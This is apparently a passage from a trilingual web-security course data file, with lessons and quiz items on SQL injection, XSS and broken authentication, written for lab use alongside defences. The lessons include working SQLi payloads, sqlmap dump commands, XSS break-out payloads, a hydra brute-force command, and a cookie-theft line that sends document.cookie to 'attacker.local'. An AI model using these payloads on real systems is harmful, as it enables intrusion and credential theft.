Ko'pincha hech narsa ko'rsatilmaydi va xato ham sizmaydi — lekin sahifa rost va yolg'on uchun baribir har xil ishlaydi. Ma'lumotni bir vaqtning o'zida bir bitdan chiqarasiz:

```
?id=1 and substring((select password from users limit 1),1,1)='a'
```

Rost → oddiy sahifa, yolg'on → boshqa sahifa. Har bir pozitsiya va belgi bo'ylab avtomatlashtiring — parol sekin chiqadi. Vaqtga asoslangan variant taxmin to'g'ri bo'lganda bazadan *uxlashni* so'raydi:

```
?id=1 and if(substring(...,1,1)='a', sleep(3), 0)
```

Uch soniyalik kechikish taxmin to'g'ri ekanini bildiradi — ma'lumot faqat javob vaqti orqali sizib chiqadi.

## sqlmap va nega baribir qo'lda usulni o'rganasiz

`sqlmap` yuqoridagi hammasini avtomatlashtiradi:

```
$ sqlmap -u "http://localhost/item.php?id=1" --batch --dbs
$ sqlmap -u "http://localhost/item.php?id=1" -D shop --tables
$ sqlmap -u "http://localhost/item.php?id=1" -D shop -T users --dump
```

U tez va puxta — lekin faqat siz ham qo'lda ko'ra oladigan narsani taniydi, va hisobotda in'ektsiya *nega* ishlashini tushuntirishingiz kerak, buni vosita siz uchun qilmaydi.

## Tuzatish

Hech qachon so'rovlarni birlashtirish bilan qurmang. **Parametrlangan so'rovlar** (tayyorlangan bayonotlar) ishlating — unda so'rov tuzilishi va ma'lumot alohida yuriladi va ma'lumot hech qachon kodga aylana olmaydi:

```
-- zaif
"SELECT * FROM users WHERE name = '" + input + "'"

-- xavfsiz: drayver tuzilish va qiymatni alohida yuboradi
"SELECT * FROM users WHERE name = ?"   input parametr sifatida bog'langan
```

Kirishni tekshirish va eng kam imtiyozli baza hisoblari yordam beradi, lekin haqiqiy davo — parametrlash. Bu moduldan bitta himoya odatini muskul xotirangizga yozsangiz, aynan shuni yozing.

## Sinab ko'ring (DVWA yoki o'z laboratoriyangizda)

1. Raqamli parametrga `1'` yuboring. SQL xatosi paydo bo'ladimi?
2. `1 and 1=1` ni `1 and 1=2` bilan solishtiring. Sahifa o'zgaradimi?
3. Laboratoriyangizga qarshi `sqlmap -u "URL" --batch --dbs` yuriting, keyin bitta topilmani qo'lda takrorlang.""",
        "contentRu": r"""SQL-инъекция — хрестоматийный пример одной фразы модуля (доверие вводу) и по-прежнему одна из самых разрушительных веб-уязвимостей. Она возникает, когда пользовательский ввод вклеивается в запрос к базе как код, а не как данные.

## Дефект

Логин может строить запрос так (псевдокод):

```
query = "SELECT * FROM users WHERE name = '" + input + "' AND pass = '" + pw + "'"
```

Введите обычное имя — работает. Введите как имя `' OR '1'='1` — запрос станет:

```
SELECT * FROM users WHERE name = '' OR '1'='1' AND pass = '...'
```

`'1'='1'` всегда истинно, поэтому `WHERE` совпадает с каждой строкой. Базе задали не тот вопрос, что написал разработчик, — потому что ввод восприняли как SQL, а не как строку.

## Обнаружение

Первый зонд — одинарная кавычка. Если она ломает запрос, ввод доходит до SQL неэкранированным:

```
$ curl "http://localhost/item.php?id=1'"
...
You have an error in your SQL syntax near ''1''' at line 1
```

Это сообщение об ошибке — подтверждённая находка. Затем проверьте классическую пару:

```
?id=1 and 1=1     → обычная страница   (истинное условие)
?id=1 and 1=2     → пустая/другая страница   (ложное условие)
```

Если страница меняется в зависимости от истинности управляемого вами условия, инъекция есть, даже когда ошибок не показывают.

## UNION: чтение других таблиц

Когда результаты отображаются, `UNION SELECT` добавляет строки из вашего запроса. Сначала найдите число столбцов через `ORDER BY`:

```
?id=1 order by 3     → работает
?id=1 order by 4     → ошибка   ⇒ столбцов 3
```

Затем достаньте реальные данные:

```
?id=-1 union select 1,username,password from users
```

`-1` заставляет исходный запрос ничего не вернуть, так что видна только ваша строка. Базы несут каталог собственной структуры, который подскажет имена таблиц и столбцов:

```
?id=-1 union select 1,table_name,3 from information_schema.tables
?id=-1 union select 1,column_name,3 from information_schema.columns where table_name='users'
```

## Слепая инъекция

Часто ничего не отображается и ошибка не утекает — но страница всё равно ведёт себя по-разному для истины и лжи. Данные извлекают по одному биту:

```
?id=1 and substring((select password from users limit 1),1,1)='a'
```

Истина → обычная страница, ложь → другая. Автоматизируйте по всем позициям и символам — пароль выпадет, медленно. Вариант на времени просит базу *поспать*, когда догадка верна:

```
?id=1 and if(substring(...,1,1)='a', sleep(3), 0)
```

Задержка в три секунды означает верную догадку — данные утекают через одно лишь время ответа.

## sqlmap и почему вы всё равно учите ручной метод

`sqlmap` автоматизирует всё вышеописанное:

```
$ sqlmap -u "http://localhost/item.php?id=1" --batch --dbs
$ sqlmap -u "http://localhost/item.php?id=1" -D shop --tables
$ sqlmap -u "http://localhost/item.php?id=1" -D shop -T users --dump
```

Он быстр и дотошен — но узнаёт лишь то, что вы и сами заметите руками, а в отчёте нужно объяснить, *почему* инъекция работает, чего инструмент за вас не сделает.

## Исправление

Никогда не стройте запросы конкатенацией. Используйте **параметризованные запросы** (подготовленные выражения), где структура запроса и данные идут раздельно и данные никогда не станут кодом:

```
-- уязвимо
"SELECT * FROM users WHERE name = '" + input + "'"

-- безопасно: драйвер шлёт структуру и значение отдельно
"SELECT * FROM users WHERE name = ?"   ввод привязан как параметр
```

Валидация ввода и учётки БД с минимальными правами помогают, но настоящее лекарство — параметризация. Если из этого модуля вы впишете в мышечную память одну защитную привычку, пусть это будет она.

## Попробуйте (на DVWA или своей лаборатории)

1. Отправьте `1'` в числовой параметр. Появляется ли ошибка SQL?
2. Сравните `1 and 1=1` с `1 and 1=2`. Меняется ли страница?
3. Запустите `sqlmap -u "URL" --batch --dbs` против своей лаборатории, затем воспроизведите одну находку вручную.""",
        "questions": [
            q("Why does `' OR '1'='1` bypass a naive login query?",
              "Nega `' OR '1'='1` sodda kirish so'rovini chetlab o'tadi?",
              "Почему `' OR '1'='1` обходит наивный запрос логина?",
              ["It makes the WHERE clause always true, matching every row",
               "It deletes the users table", "It guesses the admin password",
               "It disables the database"],
              ["U WHERE shartini har doim rost qiladi va har bir qatorga mos keladi",
               "U users jadvalini o'chiradi", "U admin parolini topadi",
               "U bazani o'chiradi"],
              ["Делает условие WHERE всегда истинным, совпадая с каждой строкой",
               "Удаляет таблицу users", "Угадывает пароль администратора",
               "Отключает базу"], 0),
            q("What is the actual fix for SQL injection?",
              "SQL in'ektsiyaning haqiqiy davosi nima?",
              "Что является настоящим исправлением SQL-инъекции?",
              ["Parameterised queries that separate structure from data",
               "Hiding SQL error messages", "Blocking the single-quote character",
               "Using a web application firewall only"],
              ["Tuzilishni ma'lumotdan ajratadigan parametrlangan so'rovlar",
               "SQL xato xabarlarini yashirish", "Bitta tirnoq belgisini bloklash",
               "Faqat veb-ilova ekranidan foydalanish"],
              ["Параметризованные запросы, разделяющие структуру и данные",
               "Скрытие сообщений об ошибках SQL", "Блокировка символа одинарной кавычки",
               "Использование только WAF"], 0),
            q("In time-based blind injection, a 3-second delay indicates:",
              "Vaqtga asoslangan ko'r in'ektsiyada 3 soniyalik kechikish nimani bildiradi:",
              "В слепой инъекции на времени задержка в 3 секунды означает:",
              ["The tested condition was true", "The server is overloaded",
               "The injection failed", "The database has crashed"],
              ["Sinalgan shart rost edi", "Server ortiqcha yuklangan",
               "In'ektsiya muvaffaqiyatsiz bo'ldi", "Baza ishdan chiqdi"],
              ["Проверяемое условие было истинным", "Сервер перегружен",
               "Инъекция не удалась", "База упала"], 0),
        ],
    },
    # ---------------------------------------------------------------- 4
    {
        "category": "web", "points": 80,
        "title": "Cross-site scripting: your code in someone else's page",
        "titleUz": "Saytlararo skript (XSS): sizning kodingiz birovning sahifasida",
        "titleRu": "Межсайтовый скриптинг: ваш код на чужой странице",
        "content": r"""If SQL injection is untrusted input reaching the database, XSS is untrusted input reaching the *browser*. Your JavaScript runs in the victim's session, on the target's domain, with all the trust that carries.

## The defect

A page echoes input back into HTML without neutralising it:

```
Hello, <?php echo $_GET['name']; ?>!
```

`?name=Alice` renders `Hello, Alice!`. But `?name=<script>alert(1)</script>` renders:

```html
Hello, <script>alert(1)</script>!
```

The browser cannot tell your script from the page's own — it is all just HTML that arrived from a trusted domain. It runs. The proof-of-concept is always `alert(1)`: harmless, unmistakable, and enough to demonstrate the flaw in a report.

## Three kinds

**Reflected** — the payload is in the request and echoed straight back. It is not stored; the victim must be lured into clicking a crafted link:

```
https://target.local/search?q=<script>alert(document.domain)</script>
```

**Stored** — the payload is saved (a comment, a profile, a support ticket) and served to everyone who views it. This is the dangerous one: no link required, and it can hit an admin who simply opens the comments queue.

**DOM-based** — the injection never touches the server. Client-side JavaScript reads something attacker-controlled (`location.hash`, say) and writes it into the page unsafely:

```javascript
document.getElementById("out").innerHTML = location.hash.slice(1);
```

`#<img src=x onerror=alert(1)>` triggers it entirely in the browser.

## Why alert(1) is only the demo

The alert proves execution; the impact is what execution *permits*. In the victim's session your script can:

Steal the session cookie, if it is not `HttpOnly`:

```javascript
new Image().src = "https://attacker.local/c?" + document.cookie;
```

Act as the user — change their email, make a request, submit a form — because the browser attaches their cookies automatically. Read anything on the page, including CSRF tokens and personal data. Log keystrokes on the page. This is why a "just an alert box" bug is rated as high as it is.

## Finding it

Inject a unique marker and see where it lands:

```
?q=xss7431test
```

Find `xss7431test` in the response. Is it inside a tag, an attribute, a script block, an HTML comment? Each context needs a different break-out, and the fastest way to see the context is to view the raw response:

```
$ curl -s "http://localhost/search?q=xss7431test" | grep -n xss7431test
42:  <div class="results">You searched for xss7431test</div>
```

Then try the payload for that context:

- In HTML text: `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`
- Inside an attribute like `value="HERE"`: `"><script>alert(1)</script>` to break out first
- Inside existing `<script>` : `';alert(1);//`

## The fix, and why one habit is not enough

Two defences, and you need both:

1. **Output encoding** — encode data for the context it lands in. In HTML, `<` becomes `&lt;`, so `<script>` renders as visible text instead of running. This is the primary fix, and it must match the context: HTML-encoding does nothing for a value placed inside a JavaScript string.

2. **Content-Security-Policy** — a header that refuses to run inline scripts and unlisted sources:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

Even if a payload slips through, a strict CSP stops it executing. It is defence in depth, not a substitute for encoding.

Modern frameworks (React, Vue, Angular) encode by default, which is why XSS today usually appears where a developer went around the framework — `dangerouslySetInnerHTML`, `v-html`, `bypassSecurityTrustHtml`. Those names are warnings, and they are where you look first.

## Try it (on DVWA or a lab you own)

1. Inject a unique marker into a search box and find where it lands in the raw HTML.
2. From that context, craft a payload that makes `alert(document.domain)` fire.
3. Post `<script>alert(1)</script>` into a comment field. Does it fire for the next visitor? That is stored XSS.""",
        "contentUz": r"""Agar SQL in'ektsiya ishonchsiz kirishning bazaga yetishi bo'lsa, XSS — ishonchsiz kirishning *brauzerga* yetishi. Sizning JavaScript'ingiz jabrlanuvchining sessiyasida, nishonning domenida, u olib yuradigan barcha ishonch bilan ishlaydi.

## Nuqson

Sahifa kirishni zararsizlantirmasdan HTML'ga qaytaradi:

```
Hello, <?php echo $_GET['name']; ?>!
```

`?name=Alice` `Hello, Alice!` ni chizadi. Lekin `?name=<script>alert(1)</script>` shuni chizadi:

```html
Hello, <script>alert(1)</script>!
```

Brauzer sizning skriptingizni sahifaning o'zinikidan ajrata olmaydi — bularning hammasi ishonchli domendan kelgan HTML. U ishlaydi. Isbot har doim `alert(1)`: zararsiz, aniq va hisobotda nuqsonni ko'rsatish uchun yetarli.

## Uch xili

**Aks etgan (Reflected)** — payload so'rovda va to'g'ridan-to'g'ri qaytariladi. Saqlanmaydi; jabrlanuvchini yasalgan havolani bosishga jalb qilish kerak:

```
https://target.local/search?q=<script>alert(document.domain)</script>
```

**Saqlangan (Stored)** — payload saqlanadi (izoh, profil, qo'llab-quvvatlash tiketi) va uni ko'radigan har kimga beriladi. Bu xavflisi: havola kerak emas, va u shunchaki izohlar navbatini ochgan adminga tegishi mumkin.

**DOM'ga asoslangan** — in'ektsiya serverga umuman tegmaydi. Mijoz tomonidagi JavaScript hujumchi boshqaradigan narsani (masalan `location.hash`) o'qib, uni sahifaga xavfli tarzda yozadi:

```javascript
document.getElementById("out").innerHTML = location.hash.slice(1);
```

`#<img src=x onerror=alert(1)>` uni butunlay brauzerda ishga tushiradi.

## Nega alert(1) faqat namoyish

Alert bajarilishni isbotlaydi; ta'sir esa bajarilish nimaga *ruxsat berishi*. Jabrlanuvchining sessiyasida sizning skriptingiz:

Sessiya cookie'sini o'g'irlashi mumkin, agar u `HttpOnly` bo'lmasa:

```javascript
new Image().src = "https://attacker.local/c?" + document.cookie;
```

Foydalanuvchi sifatida harakat qilishi — emailini o'zgartirish, so'rov qilish, forma yuborish — chunki brauzer ularning cookie'larini avtomatik biriktiradi. Sahifadagi hamma narsani, jumladan CSRF tokenlari va shaxsiy ma'lumotlarni o'qishi. Sahifada tugmalar bosilishini yozib olishi. Aynan shuning uchun "shunchaki alert oynasi" nuqsoni shunchalik yuqori baholanadi.

## Topish

Noyob belgi kiriting va u qayerga tushishini ko'ring:

```
?q=xss7431test
```

Javobda `xss7431test` ni toping. U teg ichidami, atributdami, skript blokidami, HTML izohdami? Har bir kontekst boshqa chiqib ketishni talab qiladi, va kontekstni ko'rishning eng tez yo'li — xom javobni ko'rish:

```
$ curl -s "http://localhost/search?q=xss7431test" | grep -n xss7431test
42:  <div class="results">You searched for xss7431test</div>
```

Keyin o'sha kontekst uchun payload'ni sinang:

- HTML matnida: `<script>alert(1)</script>` yoki `<img src=x onerror=alert(1)>`
- `value="BU YERDA"` kabi atribut ichida: avval chiqib ketish uchun `"><script>alert(1)</script>`
- Mavjud `<script>` ichida: `';alert(1);//`

## Tuzatish va nega bitta odat yetarli emas

Ikki himoya, va ikkalasi ham kerak:

1. **Chiqishni kodlash** — ma'lumotni tushadigan konteksti uchun kodlang. HTML'da `<` `&lt;` ga aylanadi, shunda `<script>` ishlash o'rniga ko'rinadigan matn sifatida chiziladi. Bu asosiy tuzatish va u kontekstga mos kelishi kerak: HTML-kodlash JavaScript satri ichiga qo'yilgan qiymat uchun hech narsa qilmaydi.

2. **Content-Security-Policy** — ichki skriptlarni va ro'yxatga olinmagan manbalarni ishlatishdan bosh tortadigan sarlavha:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

Payload o'tib ketsa ham, qat'iy CSP uning bajarilishini to'xtatadi. Bu chuqurlikdagi himoya, kodlashning o'rnini bosuvchi emas.

Zamonaviy freymvorklar (React, Vue, Angular) sukut bo'yicha kodlaydi — shuning uchun bugungi XSS odatda dasturchi freymvorkni aylanib o'tgan joyda paydo bo'ladi: `dangerouslySetInnerHTML`, `v-html`, `bypassSecurityTrustHtml`. Bu nomlar — ogohlantirish, va siz avval o'sha yerga qaraysiz.

## Sinab ko'ring (DVWA yoki o'z laboratoriyangizda)

1. Qidiruv oynasiga noyob belgi kiriting va u xom HTML'da qayerga tushishini toping.
2. O'sha kontekstdan `alert(document.domain)` ni ishga tushiradigan payload yasang.
3. Izoh maydoniga `<script>alert(1)</script>` yozing. U keyingi tashrif buyuruvchi uchun ishga tushadimi? Bu — saqlangan XSS.""",
        "contentRu": r"""Если SQL-инъекция — это недоверенный ввод, дошедший до базы, то XSS — недоверенный ввод, дошедший до *браузера*. Ваш JavaScript выполняется в сессии жертвы, на домене цели, со всем доверием, которое это несёт.

## Дефект

Страница выводит ввод обратно в HTML, не обезвредив его:

```
Hello, <?php echo $_GET['name']; ?>!
```

`?name=Alice` рисует `Hello, Alice!`. Но `?name=<script>alert(1)</script>` рисует:

```html
Hello, <script>alert(1)</script>!
```

Браузер не отличит ваш скрипт от собственного скрипта страницы — это всё HTML, пришедший с доверенного домена. Он выполняется. Доказательство всегда `alert(1)`: безвредно, однозначно и достаточно, чтобы показать дефект в отчёте.

## Три вида

**Отражённый (Reflected)** — пейлоад в запросе и возвращается сразу. Не хранится; жертву надо заманить кликнуть по крафтовой ссылке:

```
https://target.local/search?q=<script>alert(document.domain)</script>
```

**Хранимый (Stored)** — пейлоад сохраняется (комментарий, профиль, тикет) и отдаётся всем, кто его смотрит. Это опасный: ссылка не нужна, и он может попасть на админа, просто открывшего очередь комментариев.

**На основе DOM** — инъекция вообще не касается сервера. Клиентский JavaScript читает что-то подконтрольное атакующему (скажем, `location.hash`) и небезопасно пишет в страницу:

```javascript
document.getElementById("out").innerHTML = location.hash.slice(1);
```

`#<img src=x onerror=alert(1)>` срабатывает целиком в браузере.

## Почему alert(1) — только демонстрация

Alert доказывает выполнение; ущерб — это то, что выполнение *позволяет*. В сессии жертвы ваш скрипт может:

Украсть cookie сессии, если она не `HttpOnly`:

```javascript
new Image().src = "https://attacker.local/c?" + document.cookie;
```

Действовать от лица пользователя — сменить email, сделать запрос, отправить форму — потому что браузер сам прикрепляет его cookie. Прочитать всё на странице, включая CSRF-токены и личные данные. Логировать нажатия клавиш. Вот почему баг «всего лишь окошко alert» оценивается так высоко.

## Обнаружение

Внедрите уникальный маркер и посмотрите, куда он попал:

```
?q=xss7431test
```

Найдите `xss7431test` в ответе. Он внутри тега, атрибута, блока script, HTML-комментария? Каждый контекст требует своего выхода, и быстрее всего увидеть контекст — посмотреть сырой ответ:

```
$ curl -s "http://localhost/search?q=xss7431test" | grep -n xss7431test
42:  <div class="results">You searched for xss7431test</div>
```

Затем пробуйте пейлоад для этого контекста:

- В HTML-тексте: `<script>alert(1)</script>` или `<img src=x onerror=alert(1)>`
- Внутри атрибута вроде `value="ЗДЕСЬ"`: сначала выйти через `"><script>alert(1)</script>`
- Внутри существующего `<script>`: `';alert(1);//`

## Исправление и почему одной привычки мало

Две защиты, и нужны обе:

1. **Кодирование вывода** — кодируйте данные под контекст, куда они попадают. В HTML `<` становится `&lt;`, поэтому `<script>` рисуется видимым текстом, а не выполняется. Это основное исправление, и оно должно соответствовать контексту: HTML-кодирование ничего не даёт для значения внутри строки JavaScript.

2. **Content-Security-Policy** — заголовок, отказывающийся выполнять встроенные скрипты и неуказанные источники:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

Даже если пейлоад проскочит, строгий CSP не даст ему выполниться. Это защита в глубину, а не замена кодированию.

Современные фреймворки (React, Vue, Angular) кодируют по умолчанию — поэтому XSS сегодня обычно появляется там, где разработчик обошёл фреймворк: `dangerouslySetInnerHTML`, `v-html`, `bypassSecurityTrustHtml`. Эти имена — предупреждения, и смотреть надо сначала туда.

## Попробуйте (на DVWA или своей лаборатории)

1. Внедрите уникальный маркер в поиск и найдите, куда он попал в сыром HTML.
2. Из этого контекста соберите пейлоад, заставляющий сработать `alert(document.domain)`.
3. Отправьте `<script>alert(1)</script>` в поле комментария. Срабатывает ли у следующего посетителя? Это хранимый XSS.""",
        "questions": [
            q("What distinguishes stored XSS from reflected XSS?",
              "Saqlangan XSS'ni aks etgan XSS'dan nima ajratadi?",
              "Что отличает хранимый XSS от отражённого?",
              ["Stored XSS is saved and served to everyone who views the page",
               "Stored XSS only runs on the attacker's machine",
               "Reflected XSS is more dangerous", "They are the same thing"],
              ["Saqlangan XSS saqlanadi va sahifani ko'radigan har kimga beriladi",
               "Saqlangan XSS faqat hujumchi mashinasida ishlaydi",
               "Aks etgan XSS xavfliroq", "Ular bir xil narsa"],
              ["Хранимый XSS сохраняется и отдаётся всем, кто смотрит страницу",
               "Хранимый XSS работает только на машине атакующего",
               "Отражённый XSS опаснее", "Это одно и то же"], 0),
            q("Why can an XSS payload steal a session, and what stops it?",
              "Nega XSS payload sessiyani o'g'irlay oladi va uni nima to'xtatadi?",
              "Почему XSS-пейлоад может украсть сессию и что этому мешает?",
              ["It reads document.cookie; the HttpOnly flag prevents that",
               "It reads the server's memory; TLS prevents that",
               "It guesses the password; a strong password prevents that",
               "It cannot steal sessions at all"],
              ["U document.cookie ni o'qiydi; HttpOnly bayrog'i buni oldini oladi",
               "U server xotirasini o'qiydi; TLS buni oldini oladi",
               "U parolni topadi; kuchli parol buni oldini oladi",
               "U sessiyani umuman o'g'irlay olmaydi"],
              ["Он читает document.cookie; флаг HttpOnly это предотвращает",
               "Он читает память сервера; TLS это предотвращает",
               "Он угадывает пароль; сильный пароль это предотвращает",
               "Он вообще не может украсть сессию"], 0),
            q("What is the primary server-side fix for XSS?",
              "XSS uchun asosiy server tomonidagi tuzatish nima?",
              "Каково основное серверное исправление XSS?",
              ["Context-aware output encoding", "Blocking the word 'script'",
               "Using HTTPS", "Making all cookies Secure"],
              ["Kontekstga mos chiqish kodlash", "'script' so'zini bloklash",
               "HTTPS ishlatish", "Barcha cookie'larni Secure qilish"],
              ["Контекстно-зависимое кодирование вывода", "Блокировка слова 'script'",
               "Использование HTTPS", "Делать все cookie Secure"], 0),
        ],
    },
    # ---------------------------------------------------------------- 5
    {
        "category": "web", "points": 70,
        "title": "Broken authentication and session flaws",
        "titleUz": "Buzilgan autentifikatsiya va sessiya nuqsonlari",
        "titleRu": "Сломанная аутентификация и дефекты сессий",
        "content": r"""Authentication answers "who are you"; session management remembers the answer. Break either and an attacker becomes someone else. These flaws are common because the happy path works perfectly, so nobody tests the rest.

## Weak credential handling

The oldest attack still works when defences are missing. Brute-forcing a login with `hydra`:

```
$ hydra -l admin -P rockyou.txt target.local http-post-form \
    "/login:user=^USER^&pass=^PASS^:Invalid credentials"
```

`^USER^` and `^PASS^` are where hydra substitutes each guess; the final string is the text that marks a *failed* login, so hydra knows which attempts to discard.

What is supposed to stop this:

- **Rate limiting** — lock or slow an account after several failures
- **Account lockout** — with care, since it can be abused to lock others out
- **Strong password policy** — length over complexity rules
- **Multi-factor authentication** — a stolen password alone is not enough

A login with none of these, that also answers "no such user" differently from "wrong password", hands an attacker a way to enumerate valid usernames first and then focus the guessing.

## Username enumeration

Watch how the application answers. Different responses leak which accounts exist:

```
$ curl -s -d "user=nonexistent&pass=x" target.local/login | grep -o "No such user"
No such user
$ curl -s -d "user=admin&pass=x" target.local/login | grep -o "Invalid password"
Invalid password
```

Two different messages tell the attacker `admin` exists and `nonexistent` does not. A subtler leak is *timing*: a real account runs the (slow) password hash while a fake one returns immediately. The fix is a single generic message — "Invalid username or password" — and constant-time behaviour whether the user exists or not.

## Session token weaknesses

The session token is the identity. It must be:

- **Random** — unguessable. Sequential IDs (`session=1001`, then try `1002`) are catastrophic.
- **Long** — enough entropy to survive brute force.
- **Rotated on login** — or *session fixation* becomes possible: an attacker sets a victim's session ID before they log in, then rides the now-authenticated session.
- **Invalidated on logout** — a token that still works after logout is a token that can be replayed.

Collect a handful of tokens and look at them. Do they increment? Share a prefix? Encode a username in base64? Any structure is a weakness.

## Cookie flags, again because they matter

```
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
```

- **HttpOnly** — JavaScript cannot read it, blunting XSS-based theft
- **Secure** — never sent over plain HTTP, so a network observer cannot grab it
- **SameSite** — not sent on cross-site requests, blunting CSRF

A session cookie missing `HttpOnly` or `Secure` is a finding on its own, checkable in one line:

```
$ curl -sI target.local/login | grep -i set-cookie
```

## Password reset: the side door

The reset flow is authentication too, and it is often the weakest link. Look for:

- Predictable reset tokens (sequential, timestamp-based, short)
- A token that never expires or can be reused
- The account identifier taken from the request body, letting you reset *another* user
- The reset link leaking through the `Referer` header to third-party resources on the page

A robust reset uses a long random token, single-use, short-lived, tied server-side to the account — never trusting a user id sent alongside it.

## Try it (on a lab you own)

1. Submit a login for a user that exists and one that does not. Do the responses differ in text or timing?
2. Log in, capture the session cookie, log out, then replay the old cookie. Does it still work?
3. Collect several freshly issued tokens. Is there any visible pattern between them?""",
        "contentUz": r"""Autentifikatsiya "siz kimsiz" ga javob beradi; sessiya boshqaruvi javobni eslab qoladi. Birortasini buzsangiz, hujumchi boshqa birov bo'lib qoladi. Bu nuqsonlar keng tarqalgan, chunki to'g'ri yo'l mukammal ishlaydi, shuning uchun hech kim qolganini sinamaydi.

## Zaif hisob ma'lumotlarini boshqarish

Eng eski hujum himoya bo'lmaganda hamon ishlaydi. `hydra` bilan kirishni brute-force qilish:

```
$ hydra -l admin -P rockyou.txt target.local http-post-form \
    "/login:user=^USER^&pass=^PASS^:Invalid credentials"
```

`^USER^` va `^PASS^` — hydra har bir taxminni qo'yadigan joy; oxirgi satr — *muvaffaqiyatsiz* kirishni belgilaydigan matn, shunda hydra qaysi urinishlarni tashlashini biladi.

Buni to'xtatishi kerak bo'lgan narsalar:

- **Tezlikni cheklash** — bir necha muvaffaqiyatsizlikdan keyin hisobni qulflash yoki sekinlashtirish
- **Hisobni qulflash** — ehtiyotkorlik bilan, chunki uni boshqalarni qulflash uchun suiiste'mol qilish mumkin
- **Kuchli parol siyosati** — murakkablik qoidalaridan ko'ra uzunlik
- **Ko'p faktorli autentifikatsiya** — o'g'irlangan parol yolg'iz yetarli emas

Bularning hech biri bo'lmagan va "bunday foydalanuvchi yo'q" ni "noto'g'ri parol" dan boshqacha javob beradigan kirish hujumchiga avval yaroqli foydalanuvchi nomlarini sanash, keyin taxminni jamlash imkonini beradi.

## Foydalanuvchi nomini sanash

Ilova qanday javob berishini kuzating. Turli javoblar qaysi hisoblar mavjudligini sizdiradi:

```
$ curl -s -d "user=nonexistent&pass=x" target.local/login | grep -o "No such user"
No such user
$ curl -s -d "user=admin&pass=x" target.local/login | grep -o "Invalid password"
Invalid password
```

Ikki xil xabar hujumchiga `admin` mavjud, `nonexistent` mavjud emasligini aytadi. Nozikroq sizishi — *vaqt*: haqiqiy hisob (sekin) parol xeshini ishlatadi, soxtasi esa darrov qaytadi. Tuzatish — bitta umumiy xabar ("Foydalanuvchi nomi yoki parol noto'g'ri") va foydalanuvchi mavjudmi yoki yo'qmi, doimiy vaqtli xatti-harakat.

## Sessiya tokeni zaifliklari

Sessiya tokeni — bu shaxs. U quyidagicha bo'lishi kerak:

- **Tasodifiy** — taxmin qilib bo'lmaydigan. Ketma-ket ID'lar (`session=1001`, keyin `1002` ni sinash) halokatli.
- **Uzun** — brute force'dan omon qolishga yetarli entropiya.
- **Kirishda almashtiriladigan** — aks holda *sessiya fiksatsiyasi* mumkin bo'ladi: hujumchi jabrlanuvchining sessiya ID'sini u kirishidan oldin o'rnatadi, keyin endi autentifikatsiyalangan sessiyaga minadi.
- **Chiqishda bekor qilinadigan** — chiqishdan keyin ham ishlaydigan token qayta ishlatilishi mumkin bo'lgan token.

Bir nechta token yig'ing va ularga qarang. Ular oshib boradimi? Umumiy prefiksi bormi? Foydalanuvchi nomini base64 da kodlaydimi? Har qanday tuzilma — zaiflik.

## Cookie bayroqlari, yana, chunki ular muhim

```
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
```

- **HttpOnly** — JavaScript uni o'qiy olmaydi, XSS'ga asoslangan o'g'irlikni to'mtoqlaydi
- **Secure** — hech qachon oddiy HTTP orqali yuborilmaydi, shunda tarmoq kuzatuvchisi uni ololmaydi
- **SameSite** — saytlararo so'rovlarda yuborilmaydi, CSRF'ni to'mtoqlaydi

`HttpOnly` yoki `Secure` yo'q sessiya cookie'si o'zi-o'zicha topilma, bir satrda tekshiriladi:

```
$ curl -sI target.local/login | grep -i set-cookie
```

## Parolni tiklash: yon eshik

Tiklash oqimi ham autentifikatsiya, va u ko'pincha eng zaif bo'g'in. Quyidagilarni qidiring:

- Taxmin qilinadigan tiklash tokenlari (ketma-ket, vaqt tamg'asiga asoslangan, qisqa)
- Hech qachon tugamaydigan yoki qayta ishlatiladigan token
- Hisob identifikatori so'rov tanasidan olinadi, bu esa *boshqa* foydalanuvchini tiklash imkonini beradi
- Tiklash havolasi `Referer` sarlavhasi orqali sahifadagi uchinchi tomon resurslariga sizib chiqishi

Ishonchli tiklash uzun tasodifiy, bir martalik, qisqa muddatli, serverда hisobga bog'langan tokendan foydalanadi — hech qachon u bilan birga yuborilgan foydalanuvchi id'siga ishonmaydi.

## Sinab ko'ring (o'z laboratoriyangizda)

1. Mavjud va mavjud bo'lmagan foydalanuvchi uchun kirish yuboring. Javoblar matnda yoki vaqtda farq qiladimi?
2. Kiring, sessiya cookie'sini oling, chiqing, keyin eski cookie'ni qayta yuboring. U hamon ishlaydimi?
3. Bir necha yangi berilgan tokenni yig'ing. Ular orasida ko'rinadigan naqsh bormi?""",
        "contentRu": r"""Аутентификация отвечает «кто вы»; управление сессией помнит ответ. Сломайте любое — и атакующий становится кем-то другим. Эти дефекты часты, потому что счастливый путь работает идеально, и остальное никто не тестирует.

## Слабое обращение с учётными данными

Старейшая атака всё ещё работает при отсутствии защит. Перебор логина через `hydra`:

```
$ hydra -l admin -P rockyou.txt target.local http-post-form \
    "/login:user=^USER^&pass=^PASS^:Invalid credentials"
```

`^USER^` и `^PASS^` — куда hydra подставляет каждую догадку; последняя строка — текст, отмечающий *неудачный* вход, чтобы hydra знала, какие попытки отбросить.

Что это должно останавливать:

- **Ограничение частоты** — блокировать или замедлять после нескольких неудач
- **Блокировка учётки** — аккуратно, так как этим можно злоупотребить для блокировки других
- **Сильная парольная политика** — длина важнее правил сложности
- **Многофакторная аутентификация** — одного украденного пароля недостаточно

Логин без всего этого, к тому же отвечающий «нет такого пользователя» иначе, чем «неверный пароль», даёт атакующему сначала перечислить валидные имена, а затем сфокусировать перебор.

## Перечисление имён пользователей

Смотрите, как приложение отвечает. Разные ответы выдают, какие учётки существуют:

```
$ curl -s -d "user=nonexistent&pass=x" target.local/login | grep -o "No such user"
No such user
$ curl -s -d "user=admin&pass=x" target.local/login | grep -o "Invalid password"
Invalid password
```

Два разных сообщения говорят атакующему, что `admin` есть, а `nonexistent` нет. Более тонкая утечка — *время*: настоящая учётка запускает (медленный) хеш пароля, а фальшивая возвращается сразу. Исправление — одно общее сообщение («Неверное имя пользователя или пароль») и поведение с постоянным временем независимо от существования пользователя.

## Слабости токена сессии

Токен сессии — это личность. Он должен быть:

- **Случайным** — неугадываемым. Последовательные ID (`session=1001`, потом `1002`) катастрофичны.
- **Длинным** — достаточно энтропии, чтобы пережить перебор.
